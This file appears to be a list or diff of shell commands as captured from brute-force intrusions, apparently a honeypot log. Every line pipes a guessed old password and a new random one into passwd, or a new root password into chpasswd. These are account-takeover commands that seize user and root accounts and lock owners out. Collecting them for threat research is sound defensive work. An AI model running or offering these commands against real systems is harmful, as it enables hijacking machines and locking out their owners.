+echo "123456\nTUIYBgQnjHTk\nTUIYBgQnjHTk\n"|passwd
+echo -e "estudioremoto\nfcLk67r5Xrlo\nfcLk67r5Xrlo"|passwd|bash
+echo -e "123456\n8F7Kti4DQCYa\n8F7Kti4DQCYa"|passwd|bash
+echo "root:8F7Kti4DQCYa"|chpasswd|bash
+echo -e "adept\nYy9IgHGU8g6q\nYy9IgHGU8g6q"|passwd|bash
+echo -e "123456\nYy9IgHGU8g6q\nYy9IgHGU8g6q"|passwd|bash
+echo "123456\n3ngTaYUfz4tL\n3ngTaYUfz4tL\n"|passwd
+echo "root:Yy9IgHGU8g6q"|chpasswd|bash
+echo "123456\njQct3sO2fEJe\njQct3sO2fEJe\n"|passwd
+echo -e "Majestickmaje\nYy9IgHGU8g6q\nYy9IgHGU8g6q"|passwd|bash
+echo "estudioremoto\nfcLk67r5Xrlo\nfcLk67r5Xrlo\n"|passwd
+echo "123456\n8F7Kti4DQCYa\n8F7Kti4DQCYa\n"|passwd
+echo "adept\nYy9IgHGU8g6q\nYy9IgHGU8g6q\n"|passwd
+echo "123456\nYy9IgHGU8g6q\nYy9IgHGU8g6q\n"|passwd
+echo -e "<No\nOYJ80fOaIqah\nOYJ80fOaIqah"|passwd|bash
+echo -e "nuwanthi\naOeAUarS8Ruj\naOeAUarS8Ruj"|passwd|bash
+echo -e "franco\n8gXLF2ps5iF0\n8gXLF2ps5iF0"|passwd|bash
+echo -e "123456\n8gXLF2ps5iF0\n8gXLF2ps5iF0"|passwd|bash
+echo -e "nuwanthi\nVE6qBsAJ850j\nVE6qBsAJ850j"|passwd|bash
+echo -e "pass@123\nqNPupM10EUYH\nqNPupM10EUYH"|passwd|bash
+echo -e "1234\nE4oaeb2QwWIE\nE4oaeb2QwWIE"|passwd|bash
+echo -e "1978\nE4oaeb2QwWIE\nE4oaeb2QwWIE"|passwd|bash
+echo -e "live\n5jv0nKpZzBKh\n5jv0nKpZzBKh"|passwd|bash
+echo -e "jennifer\n5StZOR4Rrdmr\n5StZOR4Rrdmr"|passwd|bash
+echo -e "kruwaraporn\npQStJmoLD2aL\npQStJmoLD2aL"|passwd|bash
+echo -e "password\nePu9xIBBIADR\nePu9xIBBIADR"|passwd|bash
+echo -e "kruwaraporn\nEY1WQP5CniCL\nEY1WQP5CniCL"|passwd|bash
+echo "Majestickmaje\nYy9IgHGU8g6q\nYy9IgHGU8g6q\n"|passwd
+echo "nuwanthi\nVE6qBsAJ850j\nVE6qBsAJ850j\n"|passwd
+echo "pass@123\nqNPupM10EUYH\nqNPupM10EUYH\n"|passwd
+echo "1234\nE4oaeb2QwWIE\nE4oaeb2QwWIE\n"|passwd
+echo "1978\nE4oaeb2QwWIE\nE4oaeb2QwWIE\n"|passwd
+echo "<No\nOYJ80fOaIqah\nOYJ80fOaIqah\n"|passwd
+echo "nuwanthi\naOeAUarS8Ruj\naOeAUarS8Ruj\n"|passwd
+echo "franco\n8gXLF2ps5iF0\n8gXLF2ps5iF0\n"|passwd
+echo "123456\n8gXLF2ps5iF0\n8gXLF2ps5iF0\n"|passwd
+echo "jennifer\n5StZOR4Rrdmr\n5StZOR4Rrdmr\n"|passwd
+echo "live\n5jv0nKpZzBKh\n5jv0nKpZzBKh\n"|passwd
+echo -e "123456\nPdYjCQ7NcvZA\nPdYjCQ7NcvZA"|passwd|bash
+echo "kruwaraporn\nEY1WQP5CniCL\nEY1WQP5CniCL\n"|passwd
+echo "kruwaraporn\npQStJmoLD2aL\npQStJmoLD2aL\n"|passwd
+echo "password\nePu9xIBBIADR\nePu9xIBBIADR\n"|passwd
+echo "123456\nPdYjCQ7NcvZA\nPdYjCQ7NcvZA\n"|passwd
+echo -e "neeraj\ncTwnWecPM11V\ncTwnWecPM11V"|passwd|bash
+echo "neeraj\ncTwnWecPM11V\ncTwnWecPM11V\n"|passwd
+echo -e "0l0ctyQh243O63uD\nrdPiDLj6qpU1\nrdPiDLj6qpU1"|passwd|bash
+echo "0l0ctyQh243O63uD\nrdPiDLj6qpU1\nrdPiDLj6qpU1\n"|passwd
+echo -e "kannel\nruYh4YQEgz87\nruYh4YQEgz87"|passwd|bash
+echo -e "reu\nPZtdFz7RgRjC\nPZtdFz7RgRjC"|passwd|bash
+echo -e "node\nPZtdFz7RgRjC\nPZtdFz7RgRjC"|passwd|bash
+echo -e "taoyao\nRVkIMJHJlKnK\nRVkIMJHJlKnK"|passwd|bash
+echo -e "kruwaraporn\nRVkIMJHJlKnK\nRVkIMJHJlKnK"|passwd|bash
+echo -e "pers\nRVkIMJHJlKnK\nRVkIMJHJlKnK"|passwd|bash
+echo -e "sftpuser@123\nRVkIMJHJlKnK\nRVkIMJHJlKnK"|passwd|bash
+echo -e "mansour\nshooqBubdGMj\nshooqBubdGMj"|passwd|bash
+echo -e "michaelwilson\nZz6DgKkBEBvQ\nZz6DgKkBEBvQ"|passwd|bash
+echo "kannel\nruYh4YQEgz87\nruYh4YQEgz87\n"|passwd
+echo "reu\nPZtdFz7RgRjC\nPZtdFz7RgRjC\n"|passwd
+echo "node\nPZtdFz7RgRjC\nPZtdFz7RgRjC\n"|passwd
+echo -e "estudioremoto\nE5R2SpfzInW1\nE5R2SpfzInW1"|passwd|bash
+echo -e "michaelwilson\nE5R2SpfzInW1\nE5R2SpfzInW1"|passwd|bash
+echo -e "care\nJ0ZH5sSC1gvD\nJ0ZH5sSC1gvD"|passwd|bash
+echo -e "mikem\nVCwPWWTQT95B\nVCwPWWTQT95B"|passwd|bash
+echo "root:mdftxhenslBQ"|chpasswd|bash
+echo -e "mikem\nJEbZ5Xk3BBQH\nJEbZ5Xk3BBQH"|passwd|bash
+echo -e "mikem\nZc5vAv1Dt8sX\nZc5vAv1Dt8sX"|passwd|bash
+echo "taoyao\nRVkIMJHJlKnK\nRVkIMJHJlKnK\n"|passwd
+echo -e "admin123\ns3oCK8zCCl31\ns3oCK8zCCl31"|passwd|bash
+echo -e "mercaderista\nuWIGYaHk6fo4\nuWIGYaHk6fo4"|passwd|bash
+echo "kruwaraporn\nRVkIMJHJlKnK\nRVkIMJHJlKnK\n"|passwd
+echo "pers\nRVkIMJHJlKnK\nRVkIMJHJlKnK\n"|passwd
+echo -e "123456\nEG3TimMZcQj7\nEG3TimMZcQj7"|passwd|bash
+echo "sftpuser@123\nRVkIMJHJlKnK\nRVkIMJHJlKnK\n"|passwd
+echo -e "Pa$$w0rd\nuWIGYaHk6fo4\nuWIGYaHk6fo4"|passwd|bash
+echo -e "bodega\nuWIGYaHk6fo4\nuWIGYaHk6fo4"|passwd|bash
+echo -e "apc123\nuWIGYaHk6fo4\nuWIGYaHk6fo4"|passwd|bash
+echo -e "andreas\nOzn2xEIpPyhf\nOzn2xEIpPyhf"|passwd|bash
+echo -e "london7\nOzn2xEIpPyhf\nOzn2xEIpPyhf"|passwd|bash
+echo -e "reden\nOzn2xEIpPyhf\nOzn2xEIpPyhf"|passwd|bash
+echo -e "fabi\nJzLzQUqwJJtq\nJzLzQUqwJJtq"|passwd|bash
+echo "root:E5R2SpfzInW1"|chpasswd|bash
+echo -e "reu\nJzLzQUqwJJtq\nJzLzQUqwJJtq"|passwd|bash
+echo -e "12345\nJzLzQUqwJJtq\nJzLzQUqwJJtq"|passwd|bash
+echo -e "123456789\nVCwPWWTQT95B\nVCwPWWTQT95B"|passwd|bash
+echo -e "estudioremoto\nOzn2xEIpPyhf\nOzn2xEIpPyhf"|passwd|bash
+echo "mansour\nshooqBubdGMj\nshooqBubdGMj\n"|passwd
+echo "estudioremoto\nE5R2SpfzInW1\nE5R2SpfzInW1\n"|passwd
+echo "michaelwilson\nE5R2SpfzInW1\nE5R2SpfzInW1\n"|passwd
+echo "care\nJ0ZH5sSC1gvD\nJ0ZH5sSC1gvD\n"|passwd
+echo "mikem\nVCwPWWTQT95B\nVCwPWWTQT95B\n"|passwd
+echo -e "ali123\niDovnXZA5kD2\niDovnXZA5kD2"|passwd|bash
+echo -e "123456789\nX7NPuZR0vRP2\nX7NPuZR0vRP2"|passwd|bash
+echo -e "mysql123\nSFU2B4kzoOTx\nSFU2B4kzoOTx"|passwd|bash
+echo -e "dbmaker\nSFU2B4kzoOTx\nSFU2B4kzoOTx"|passwd|bash
+echo -e "ali123\niCV1C9LRf2cp\niCV1C9LRf2cp"|passwd|bash
+echo -e "taoyao\nOzn2xEIpPyhf\nOzn2xEIpPyhf"|passwd|bash
+echo "michaelwilson\nZz6DgKkBEBvQ\nZz6DgKkBEBvQ\n"|passwd
+echo "mikem\nJEbZ5Xk3BBQH\nJEbZ5Xk3BBQH\n"|passwd
+echo "mikem\nZc5vAv1Dt8sX\nZc5vAv1Dt8sX\n"|passwd
+echo "admin123\ns3oCK8zCCl31\ns3oCK8zCCl31\n"|passwd
+echo "mercaderista\nuWIGYaHk6fo4\nuWIGYaHk6fo4\n"|passwd
+echo "123456\nEG3TimMZcQj7\nEG3TimMZcQj7\n"|passwd
+echo "Pa$$w0rd\nuWIGYaHk6fo4\nuWIGYaHk6fo4\n"|passwd
+echo "bodega\nuWIGYaHk6fo4\nuWIGYaHk6fo4\n"|passwd
+echo "apc123\nuWIGYaHk6fo4\nuWIGYaHk6fo4\n"|passwd
+echo "andreas\nOzn2xEIpPyhf\nOzn2xEIpPyhf\n"|passwd
+echo "london7\nOzn2xEIpPyhf\nOzn2xEIpPyhf\n"|passwd
+echo "reden\nOzn2xEIpPyhf\nOzn2xEIpPyhf\n"|passwd
+echo -e "estudioremoto\n0BRGVlimenGl\n0BRGVlimenGl"|passwd|bash
+echo -e "renatav\n0BRGVlimenGl\n0BRGVlimenGl"|passwd|bash
+echo -e "adept\nX7NPuZR0vRP2\nX7NPuZR0vRP2"|passwd|bash
+echo -e "1q2w3e4r\nX7NPuZR0vRP2\nX7NPuZR0vRP2"|passwd|bash
+echo "estudioremoto\nOzn2xEIpPyhf\nOzn2xEIpPyhf\n"|passwd
+echo "fabi\nJzLzQUqwJJtq\nJzLzQUqwJJtq\n"|passwd
+echo "reu\nJzLzQUqwJJtq\nJzLzQUqwJJtq\n"|passwd
+echo "12345\nJzLzQUqwJJtq\nJzLzQUqwJJtq\n"|passwd
+echo "123456789\nVCwPWWTQT95B\nVCwPWWTQT95B\n"|passwd
+echo "ali123\niDovnXZA5kD2\niDovnXZA5kD2\n"|passwd
+echo "123456789\nX7NPuZR0vRP2\nX7NPuZR0vRP2\n"|passwd
+echo "mysql123\nSFU2B4kzoOTx\nSFU2B4kzoOTx\n"|passwd
+echo "ali123\niCV1C9LRf2cp\niCV1C9LRf2cp\n"|passwd
+echo "dbmaker\nSFU2B4kzoOTx\nSFU2B4kzoOTx\n"|passwd
+echo "taoyao\nOzn2xEIpPyhf\nOzn2xEIpPyhf\n"|passwd
+echo "adept\nX7NPuZR0vRP2\nX7NPuZR0vRP2\n"|passwd
+echo "1q2w3e4r\nX7NPuZR0vRP2\nX7NPuZR0vRP2\n"|passwd
+echo "estudioremoto\n0BRGVlimenGl\n0BRGVlimenGl\n"|passwd
+echo "renatav\n0BRGVlimenGl\n0BRGVlimenGl\n"|passwd
+echo -e "renatav\n7DsCIY5FYqmB\n7DsCIY5FYqmB"|passwd|bash
+echo -e "123\nn3C4W8hKUXym\nn3C4W8hKUXym"|passwd|bash
+echo "root:n3C4W8hKUXym"|chpasswd|bash
+echo -e "iakovidis\n7DsCIY5FYqmB\n7DsCIY5FYqmB"|passwd|bash
+echo -e "adept\n7DsCIY5FYqmB\n7DsCIY5FYqmB"|passwd|bash
+echo "renatav\n7DsCIY5FYqmB\n7DsCIY5FYqmB\n"|passwd
+echo -e "iakovidis\n8vbdSurOd4pV\n8vbdSurOd4pV"|passwd|bash
+echo -e "care\nelfxIM84ek7b\nelfxIM84ek7b"|passwd|bash
+echo "iakovidis\n7DsCIY5FYqmB\n7DsCIY5FYqmB\n"|passwd
+echo "adept\n7DsCIY5FYqmB\n7DsCIY5FYqmB\n"|passwd
+echo "123\nn3C4W8hKUXym\nn3C4W8hKUXym\n"|passwd
+echo "iakovidis\n8vbdSurOd4pV\n8vbdSurOd4pV\n"|passwd
+echo "root:B2HEVZYv92mm"|chpasswd|bash
+echo -e "estudioremoto\n10RJIOxbdALW\n10RJIOxbdALW"|passwd|bash
+echo -e "wirat\nB2HEVZYv92mm\nB2HEVZYv92mm"|passwd|bash
+echo -e "wirat\nyBpwtG62D822\nyBpwtG62D822"|passwd|bash
+echo "root:yBpwtG62D822"|chpasswd|bash
+echo "care\nelfxIM84ek7b\nelfxIM84ek7b\n"|passwd
+echo "root:Pz3FrnSt4d2Q"|chpasswd|bash
+echo -e "12\nyT2eX0844qVX\nyT2eX0844qVX"|passwd|bash
+echo -e "11\nyT2eX0844qVX\nyT2eX0844qVX"|passwd|bash
+echo -e "suporte\nyT2eX0844qVX\nyT2eX0844qVX"|passwd|bash
+echo -e "wirat\nyT2eX0844qVX\nyT2eX0844qVX"|passwd|bash
+echo "estudioremoto\n10RJIOxbdALW\n10RJIOxbdALW\n"|passwd
+echo "wirat\nB2HEVZYv92mm\nB2HEVZYv92mm\n"|passwd
+echo "root:jYdGOGOBXvQ5"|chpasswd|bash
+echo "root:72C5tIM84mCG"|chpasswd|bash
+echo -e "care\nyT2eX0844qVX\nyT2eX0844qVX"|passwd|bash
+echo "root:phunQ2Ib68Ma"|chpasswd|bash
+echo "wirat\nyBpwtG62D822\nyBpwtG62D822\n"|passwd
+echo -e "1q2w3e\njYdGOGOBXvQ5\njYdGOGOBXvQ5"|passwd|bash
+echo "root:R50gApMNPkIQ"|chpasswd|bash
+echo "root:KbsApyPTpzwd"|chpasswd|bash
+echo -e "celery\nVCm7CCMZelCw\nVCm7CCMZelCw"|passwd|bash
+echo -e "password\nVCm7CCMZelCw\nVCm7CCMZelCw"|passwd|bash
+echo "12\nyT2eX0844qVX\nyT2eX0844qVX\n"|passwd
+echo "11\nyT2eX0844qVX\nyT2eX0844qVX\n"|passwd
+echo "suporte\nyT2eX0844qVX\nyT2eX0844qVX\n"|passwd
+echo "wirat\nyT2eX0844qVX\nyT2eX0844qVX\n"|passwd
+echo -e "estudioremoto\nKbsApyPTpzwd\nKbsApyPTpzwd"|passwd|bash
+echo "care\nyT2eX0844qVX\nyT2eX0844qVX\n"|passwd
+echo "1q2w3e\njYdGOGOBXvQ5\njYdGOGOBXvQ5\n"|passwd
+echo "celery\nVCm7CCMZelCw\nVCm7CCMZelCw\n"|passwd
+echo "password\nVCm7CCMZelCw\nVCm7CCMZelCw\n"|passwd
+echo "estudioremoto\nKbsApyPTpzwd\nKbsApyPTpzwd\n"|passwd
+echo -e "celery\nAesGHhhGguvL\nAesGHhhGguvL"|passwd|bash
+echo -e "1q2w3e\nYVohXAG7QOdH\nYVohXAG7QOdH"|passwd|bash
+echo "celery\nAesGHhhGguvL\nAesGHhhGguvL\n"|passwd
+echo "1q2w3e\nYVohXAG7QOdH\nYVohXAG7QOdH\n"|passwd
+echo -e "estudioremoto\n1oxvJk7QZW5s\n1oxvJk7QZW5s"|passwd|bash
+echo -e "sofia123\n1oxvJk7QZW5s\n1oxvJk7QZW5s"|passwd|bash
+echo -e "dbmaker\nBGCQjAlkhpov\nBGCQjAlkhpov"|passwd|bash
+echo -e "dbmaker\nt3Zt7ONTCW2R\nt3Zt7ONTCW2R"|passwd|bash
+echo "estudioremoto\n1oxvJk7QZW5s\n1oxvJk7QZW5s\n"|passwd
+echo "sofia123\n1oxvJk7QZW5s\n1oxvJk7QZW5s\n"|passwd
+echo "root:LNrbOQdc1Vvu"|chpasswd|bash
+echo "dbmaker\nBGCQjAlkhpov\nBGCQjAlkhpov\n"|passwd
+echo "dbmaker\nt3Zt7ONTCW2R\nt3Zt7ONTCW2R\n"|passwd
+echo -e "iakovidis\n7qIlgdHo7xCX\n7qIlgdHo7xCX"|passwd|bash
+echo -e "Ab123\nQpure1fpR6RV\nQpure1fpR6RV"|passwd|bash
+echo -e "iakovidis\nUBvPnbsU95wG\nUBvPnbsU95wG"|passwd|bash
+echo "iakovidis\n7qIlgdHo7xCX\n7qIlgdHo7xCX\n"|passwd
+echo "Ab123\nQpure1fpR6RV\nQpure1fpR6RV\n"|passwd
+echo -e "iakovidis\nHzOZHB1sRr6V\nHzOZHB1sRr6V"|passwd|bash
+echo -e "dbmaker\nwlrHocsQmeCG\nwlrHocsQmeCG"|passwd|bash
+echo -e "make\ncq3e8TJuywuo\ncq3e8TJuywuo"|passwd|bash
+echo "iakovidis\nUBvPnbsU95wG\nUBvPnbsU95wG\n"|passwd
+echo -e "adept\npNyT4SwcTDLf\npNyT4SwcTDLf"|passwd|bash
+echo -e "concretyourdev\nqOrStvHUGcoj\nqOrStvHUGcoj"|passwd|bash
+echo "iakovidis\nHzOZHB1sRr6V\nHzOZHB1sRr6V\n"|passwd
+echo -e "123456\nArobxHPuUWCb\nArobxHPuUWCb"|passwd|bash
+echo "dbmaker\nwlrHocsQmeCG\nwlrHocsQmeCG\n"|passwd
+echo "make\ncq3e8TJuywuo\ncq3e8TJuywuo\n"|passwd
+echo "adept\npNyT4SwcTDLf\npNyT4SwcTDLf\n"|passwd
+echo "concretyourdev\nqOrStvHUGcoj\nqOrStvHUGcoj\n"|passwd
+echo -e "dbmaker\nMhGNvBj7aJ4v\nMhGNvBj7aJ4v"|passwd|bash
+echo -e "dbmaker\nVNPzmTJvImPl\nVNPzmTJvImPl"|passwd|bash
+echo -e "mikem\ndZyEt9H0fn3p\ndZyEt9H0fn3p"|passwd|bash
+echo -e "dbmaker\n2KCgFSAZ9jNa\n2KCgFSAZ9jNa"|passwd|bash
+echo -e "123456\n5CmQp3SqInQF\n5CmQp3SqInQF"|passwd|bash
+echo "123456\nArobxHPuUWCb\nArobxHPuUWCb\n"|passwd
+echo "dbmaker\nMhGNvBj7aJ4v\nMhGNvBj7aJ4v\n"|passwd
+echo "dbmaker\nVNPzmTJvImPl\nVNPzmTJvImPl\n"|passwd
+echo "mikem\ndZyEt9H0fn3p\ndZyEt9H0fn3p\n"|passwd
+echo "dbmaker\n2KCgFSAZ9jNa\n2KCgFSAZ9jNa\n"|passwd
+echo "123456\n5CmQp3SqInQF\n5CmQp3SqInQF\n"|passwd
+echo -e "123456\nsgx01sJ0W0La\nsgx01sJ0W0La"|passwd|bash
+echo -e "adept\nsgx01sJ0W0La\nsgx01sJ0W0La"|passwd|bash
+echo -e "iakovidis\nPGjYltMqR5zg\nPGjYltMqR5zg"|passwd|bash
+echo -e "concretyourdev\nPnkgqIvQCplq\nPnkgqIvQCplq"|passwd|bash
+echo "123456\nsgx01sJ0W0La\nsgx01sJ0W0La\n"|passwd
+echo "adept\nsgx01sJ0W0La\nsgx01sJ0W0La\n"|passwd
+echo "iakovidis\nPGjYltMqR5zg\nPGjYltMqR5zg\n"|passwd
+echo "concretyourdev\nPnkgqIvQCplq\nPnkgqIvQCplq\n"|passwd
+echo -e "mikem\nh4CYWzXWdOqs\nh4CYWzXWdOqs"|passwd|bash
+echo -e "tpering\nh4CYWzXWdOqs\nh4CYWzXWdOqs"|passwd|bash
+echo -e "eka\nQR8Jh4LXKSaF\nQR8Jh4LXKSaF"|passwd|bash
+echo "mikem\nh4CYWzXWdOqs\nh4CYWzXWdOqs\n"|passwd
+echo "tpering\nh4CYWzXWdOqs\nh4CYWzXWdOqs\n"|passwd
+echo "eka\nQR8Jh4LXKSaF\nQR8Jh4LXKSaF\n"|passwd
+echo -e "iakovidis\nsnmSku7vcSWu\nsnmSku7vcSWu"|passwd|bash
+echo "iakovidis\nsnmSku7vcSWu\nsnmSku7vcSWu\n"|passwd
+echo -e "kruwaraporn\nhA5Ck1uig48Q\nhA5Ck1uig48Q"|passwd|bash
+echo "kruwaraporn\nhA5Ck1uig48Q\nhA5Ck1uig48Q\n"|passwd
+echo -e "123456\ng3iZFos6uhPZ\ng3iZFos6uhPZ"|passwd|bash
+echo -e "123\nurJcg4KrTdPs\nurJcg4KrTdPs"|passwd|bash
+echo -e "reu\nXYyIFYSGrEcW\nXYyIFYSGrEcW"|passwd|bash
+echo "123456\ng3iZFos6uhPZ\ng3iZFos6uhPZ\n"|passwd
+echo -e "123456\nHuRoSEEmwiUz\nHuRoSEEmwiUz"|passwd|bash
+echo -e "mysql123\nMfel55JlJ8CX\nMfel55JlJ8CX"|passwd|bash
+echo -e "reu\nMfel55JlJ8CX\nMfel55JlJ8CX"|passwd|bash
+echo -e "mysql123\nuvDGfxfR9vCh\nuvDGfxfR9vCh"|passwd|bash
+echo -e "wirat\n4Ruz9TYYHbzL\n4Ruz9TYYHbzL"|passwd|bash
+echo -e "tpering\nvEfmnjdqQFNw\nvEfmnjdqQFNw"|passwd|bash
+echo -e "123456\nhhjZ2v0zgz6s\nhhjZ2v0zgz6s"|passwd|bash
+echo "123\nurJcg4KrTdPs\nurJcg4KrTdPs\n"|passwd
+echo "reu\nXYyIFYSGrEcW\nXYyIFYSGrEcW\n"|passwd
+echo "123456\nHuRoSEEmwiUz\nHuRoSEEmwiUz\n"|passwd
+echo -e "123456\npQARSzdP3qm1\npQARSzdP3qm1"|passwd|bash
+echo "mysql123\nMfel55JlJ8CX\nMfel55JlJ8CX\n"|passwd
+echo "reu\nMfel55JlJ8CX\nMfel55JlJ8CX\n"|passwd
+echo "mysql123\nuvDGfxfR9vCh\nuvDGfxfR9vCh\n"|passwd
+echo "wirat\n4Ruz9TYYHbzL\n4Ruz9TYYHbzL\n"|passwd
+echo -e "mysql123\nkuqRCdT6iQ61\nkuqRCdT6iQ61"|passwd|bash
+echo -e "wirat\nN1C49U6ssdZ9\nN1C49U6ssdZ9"|passwd|bash
+echo -e "arma3\nN1C49U6ssdZ9\nN1C49U6ssdZ9"|passwd|bash
+echo -e "kruwaraporn\n5npqTchkKGHS\n5npqTchkKGHS"|passwd|bash
+echo -e "qwedcxz\nvEfmnjdqQFNw\nvEfmnjdqQFNw"|passwd|bash
+echo "tpering\nvEfmnjdqQFNw\nvEfmnjdqQFNw\n"|passwd
+echo -e "api123\niKdICF8VyNjC\niKdICF8VyNjC"|passwd|bash
+echo "123456\npQARSzdP3qm1\npQARSzdP3qm1\n"|passwd
+echo -e "123456\nZwphtd3SkR21\nZwphtd3SkR21"|passwd|bash
+echo "123456\nhhjZ2v0zgz6s\nhhjZ2v0zgz6s\n"|passwd
+echo "mysql123\nkuqRCdT6iQ61\nkuqRCdT6iQ61\n"|passwd
+echo "wirat\nN1C49U6ssdZ9\nN1C49U6ssdZ9\n"|passwd
+echo "arma3\nN1C49U6ssdZ9\nN1C49U6ssdZ9\n"|passwd
+echo "kruwaraporn\n5npqTchkKGHS\n5npqTchkKGHS\n"|passwd
+echo "qwedcxz\nvEfmnjdqQFNw\nvEfmnjdqQFNw\n"|passwd
+echo "root:gwWUxpVbwfIJ"|chpasswd|bash
+echo -e "wirat\nk39nyXjydAEd\nk39nyXjydAEd"|passwd|bash
+echo -e "mysql123\n1z2mKwLXn3Rh\n1z2mKwLXn3Rh"|passwd|bash
+echo -e "123456\nk39nyXjydAEd\nk39nyXjydAEd"|passwd|bash
+echo -e "node\ngwWUxpVbwfIJ\ngwWUxpVbwfIJ"|passwd|bash
+echo -e "gazelle\ngwWUxpVbwfIJ\ngwWUxpVbwfIJ"|passwd|bash
+echo "api123\niKdICF8VyNjC\niKdICF8VyNjC\n"|passwd
+echo "123456\nZwphtd3SkR21\nZwphtd3SkR21\n"|passwd
+echo -e "jbquilla\nQlB1qAr5UmZW\nQlB1qAr5UmZW"|passwd|bash
+echo -e "doule\n1YHxDeg62Tsg\n1YHxDeg62Tsg"|passwd|bash
+echo "root:QlB1qAr5UmZW"|chpasswd|bash
+echo "wirat\nk39nyXjydAEd\nk39nyXjydAEd\n"|passwd
+echo "mysql123\n1z2mKwLXn3Rh\n1z2mKwLXn3Rh\n"|passwd
+echo "123456\nk39nyXjydAEd\nk39nyXjydAEd\n"|passwd
+echo "node\ngwWUxpVbwfIJ\ngwWUxpVbwfIJ\n"|passwd
+echo "gazelle\ngwWUxpVbwfIJ\ngwWUxpVbwfIJ\n"|passwd
+echo "jbquilla\nQlB1qAr5UmZW\nQlB1qAr5UmZW\n"|passwd
+echo "doule\n1YHxDeg62Tsg\n1YHxDeg62Tsg\n"|passwd
+echo -e "tanw\nR7oqie62VUAE\nR7oqie62VUAE"|passwd|bash
+echo "tanw\nR7oqie62VUAE\nR7oqie62VUAE\n"|passwd
+echo -e "1234\n90NSam70J0G0\n90NSam70J0G0"|passwd|bash
+echo -e "wangyifa\nPrKV9pQUX3iz\nPrKV9pQUX3iz"|passwd|bash
+echo "root:ff2TzqkmUj1Y"|chpasswd|bash
+echo -e "jbquilla\nPrKV9pQUX3iz\nPrKV9pQUX3iz"|passwd|bash
+echo -e "at\nt3Zt7ONTCW2R\nt3Zt7ONTCW2R"|passwd|bash
+echo -e "123456\nWKKbc9ZhOESj\nWKKbc9ZhOESj"|passwd|bash
+echo "wangyifa\nPrKV9pQUX3iz\nPrKV9pQUX3iz\n"|passwd
+echo -e "live\n7vLMr8Xo8iTn\n7vLMr8Xo8iTn"|passwd|bash
+echo -e "care\n7vLMr8Xo8iTn\n7vLMr8Xo8iTn"|passwd|bash
+echo "1234\n90NSam70J0G0\n90NSam70J0G0\n"|passwd
+echo -e "live\nWKKbc9ZhOESj\nWKKbc9ZhOESj"|passwd|bash
+echo "at\nt3Zt7ONTCW2R\nt3Zt7ONTCW2R\n"|passwd
+echo "123456\nWKKbc9ZhOESj\nWKKbc9ZhOESj\n"|passwd
+echo -e "fabi\nY2GMOTh43reg\nY2GMOTh43reg"|passwd|bash
+echo "jbquilla\nPrKV9pQUX3iz\nPrKV9pQUX3iz\n"|passwd
+echo -e "fabi\nmvq7KOeHkGpm\nmvq7KOeHkGpm"|passwd|bash
+echo "live\n7vLMr8Xo8iTn\n7vLMr8Xo8iTn\n"|passwd
+echo "care\n7vLMr8Xo8iTn\n7vLMr8Xo8iTn\n"|passwd
+echo -e "Majestickmaje\nY2GMOTh43reg\nY2GMOTh43reg"|passwd|bash
+echo -e "hades520\n2wYz2KsW0UG3\n2wYz2KsW0UG3"|passwd|bash
+echo -e "1234\n2wYz2KsW0UG3\n2wYz2KsW0UG3"|passwd|bash
+echo -e "xuwei\nLwrH1pYbtjxl\nLwrH1pYbtjxl"|passwd|bash
+echo -e "wlw123\nG9uOPO2xIKqz\nG9uOPO2xIKqz"|passwd|bash
+echo "live\nWKKbc9ZhOESj\nWKKbc9ZhOESj\n"|passwd
+echo "root:Md5Ngb4FPAxP"|chpasswd|bash
+echo -e "andreas\nG9uOPO2xIKqz\nG9uOPO2xIKqz"|passwd|bash
+echo "fabi\nY2GMOTh43reg\nY2GMOTh43reg\n"|passwd
+echo "fabi\nmvq7KOeHkGpm\nmvq7KOeHkGpm\n"|passwd
+echo "xuwei\nLwrH1pYbtjxl\nLwrH1pYbtjxl\n"|passwd
+echo "hades520\n2wYz2KsW0UG3\n2wYz2KsW0UG3\n"|passwd
+echo -e "pers\nOvnFMowBk1qQ\nOvnFMowBk1qQ"|passwd|bash
+echo "1234\n2wYz2KsW0UG3\n2wYz2KsW0UG3\n"|passwd
+echo -e "bodega\nYjYuXlCdHihe\nYjYuXlCdHihe"|passwd|bash
+echo "Majestickmaje\nY2GMOTh43reg\nY2GMOTh43reg\n"|passwd
+echo "wlw123\nG9uOPO2xIKqz\nG9uOPO2xIKqz\n"|passwd
+echo "andreas\nG9uOPO2xIKqz\nG9uOPO2xIKqz\n"|passwd
+echo "pers\nOvnFMowBk1qQ\nOvnFMowBk1qQ\n"|passwd
+echo "bodega\nYjYuXlCdHihe\nYjYuXlCdHihe\n"|passwd
+echo -e "lisapass\nAV0Cxjswi13T\nAV0Cxjswi13T"|passwd|bash
+echo -e "anypass\nAV0Cxjswi13T\nAV0Cxjswi13T"|passwd|bash
+echo -e "andreas\nzU20P75joMLJ\nzU20P75joMLJ"|passwd|bash
+echo "lisapass\nAV0Cxjswi13T\nAV0Cxjswi13T\n"|passwd
+echo "anypass\nAV0Cxjswi13T\nAV0Cxjswi13T\n"|passwd
+echo "andreas\nzU20P75joMLJ\nzU20P75joMLJ\n"|passwd
+echo -e "virginia\nkxFah9vZpXku\nkxFah9vZpXku"|passwd|bash
+echo -e "1\nHlHE2l1YgdMN\nHlHE2l1YgdMN"|passwd|bash
+echo "virginia\nkxFah9vZpXku\nkxFah9vZpXku\n"|passwd
+echo "1\nHlHE2l1YgdMN\nHlHE2l1YgdMN\n"|passwd
+echo "root:1HawX5E6bQ0W"|chpasswd|bash
+echo -e "dvr\n6XRHD3cVlA1f\n6XRHD3cVlA1f"|passwd|bash
+echo -e "beaches\nb2uzM4TsMEXp\nb2uzM4TsMEXp"|passwd|bash
+echo -e "wangyifa\npTkAhxzbb6sa\npTkAhxzbb6sa"|passwd|bash
+echo "dvr\n6XRHD3cVlA1f\n6XRHD3cVlA1f\n"|passwd
+echo "beaches\nb2uzM4TsMEXp\nb2uzM4TsMEXp\n"|passwd
+echo -e "pers\niiHTXeK9SVjV\niiHTXeK9SVjV"|passwd|bash
+echo -e "password\nxIFM1Fxn7RBw\nxIFM1Fxn7RBw"|passwd|bash
+echo -e "raju\nxIFM1Fxn7RBw\nxIFM1Fxn7RBw"|passwd|bash
+echo -e "Password\nxIFM1Fxn7RBw\nxIFM1Fxn7RBw"|passwd|bash
+echo "wangyifa\npTkAhxzbb6sa\npTkAhxzbb6sa\n"|passwd
+echo "pers\niiHTXeK9SVjV\niiHTXeK9SVjV\n"|passwd
+echo "password\nxIFM1Fxn7RBw\nxIFM1Fxn7RBw\n"|passwd
+echo "raju\nxIFM1Fxn7RBw\nxIFM1Fxn7RBw\n"|passwd
+echo "Password\nxIFM1Fxn7RBw\nxIFM1Fxn7RBw\n"|passwd
